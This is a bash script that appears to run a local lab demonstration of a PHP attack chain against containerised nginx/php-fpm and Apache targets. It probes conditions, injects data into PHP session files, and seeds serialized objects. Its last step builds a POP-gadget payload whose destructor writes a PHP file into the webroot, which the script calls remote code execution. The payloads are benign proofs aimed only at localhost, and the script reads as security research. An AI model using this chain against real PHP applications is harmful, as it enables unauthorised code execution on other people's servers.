#!/usr/bin/env bash
# End-to-end demonstration against the local lab. Safe: benign gadget only.
#   ./run_demo.sh            # against nginx->fpm (18080)
#   ./run_demo.sh apache     # against apache mod_php (18081)
set -euo pipefail
cd "$(dirname "$0")"

if [[ "${1:-fpm}" == "apache" ]]; then
  URL="http://127.0.0.1:18081"; CTR="oomlab-apache"
else
  URL="http://127.0.0.1:18080"; CTR="oomlab-fpm"
fi
SIDES="/var/lib/php/sessions"

echo "============================================================"
echo " STEP 0  Detection (read-only)"
echo "============================================================"
python3 probe_conditions.py --url "$URL"

echo; echo "============================================================"
echo " STEP 1  Primitive 1: session-file injection (upload_progress)"
echo "============================================================"
python3 demo_injection.py --url "$URL" --sid labdemo123
echo "  --- session file on the server now contains: ---"
podman exec "$CTR" sh -c "cat $SIDES/sess_labdemo123 2>/dev/null | head -c 400" || true
echo

echo; echo "============================================================"
echo " STEP 2  Primitive 2: object __destruct reachability (leverage)"
echo "============================================================"
# Seed a session file with a benign serialised gadget -- this stands in for an
# injection achieved through STEP 1 whose bytes encode an object.
PAYLOAD='canary|O:13:"DestructProbe":1:{s:6:"marker";s:9:"rce-proof";}'
# Seed as the php worker user (www-data) so session_start can open it RDWR.
podman exec -u www-data "$CTR" sh -c "printf '%s' '$PAYLOAD' > $SIDES/sess_canarydemo"
# Clear any previous marker so the demo is clean.
podman exec -u www-data "$CTR" sh -c "rm -f /tmp/destruct_marker.log" || true
python3 demo_destruct.py --url "$URL" --sid canarydemo

echo; echo "============================================================"
echo " STEP 3  POP gadget -> file write -> RCE (no LFI/RFI)"
echo "============================================================"
# Serialized CacheFlush whose destructor writes a PHP proof file to webroot.
DROP="/var/www/html/data/rce_proof.php"
PROOF='<?php echo "RCE-PROOF user=".get_current_user()." host=".php_uname("n")." php=".PHP_VERSION;'
SESS=$(python3 - "$DROP" "$PROOF" <<'PY'
import sys
path, html = sys.argv[1], sys.argv[2]
obj = f'O:10:"CacheFlush":2:{{s:9:"cacheFile";s:{len(path)}:"{path}";s:4:"html";s:{len(html)}:"{html}";}}'
print("rce|" + obj, end="")
PY
)
podman exec -u www-data "$CTR" sh -c "mkdir -p /var/www/html/data; printf '%s' '$SESS' > $SIDES/sess_rcedemo"
python3 demo_rce.py --url "$URL" --sid rcedemo

echo; echo "Demo complete."
